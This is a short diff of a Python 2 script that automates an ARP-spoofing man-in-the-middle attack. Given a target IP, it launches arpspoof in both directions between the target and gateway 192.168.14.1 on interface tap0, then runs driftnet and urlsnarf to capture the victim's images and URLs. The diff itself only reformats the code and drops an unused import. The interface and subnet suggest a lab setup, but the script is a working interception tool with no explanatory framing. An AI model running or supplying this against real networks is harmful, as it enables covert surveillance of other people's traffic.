@@ -1,15 +1,14 @@
-#!/usr/bin/python
+#!/usr/bin/env python
 __author__ = 'mannea'
 import sys
-import datetime
 import os
 
 if len(sys.argv) != 2:
     print " <ip address>"
     sys.exit(0)
 
-
 address = sys.argv[1].strip()
 
-os.system('xterm -e "arpspoof -i tap0 -t 192.168.14.1 '+address+'" & xterm -e "arpspoof -i tap0 -t '+address+' 192.168.14.1" &  xterm -e "driftnet -i tap0 & urlsnarf -i tap0" & ')
+os.system(
+    'xterm -e "arpspoof -i tap0 -t 192.168.14.1 ' + address + '" & xterm -e "arpspoof -i tap0 -t ' + address + ' 192.168.14.1" &  xterm -e "driftnet -i tap0 & urlsnarf -i tap0" & ')
 
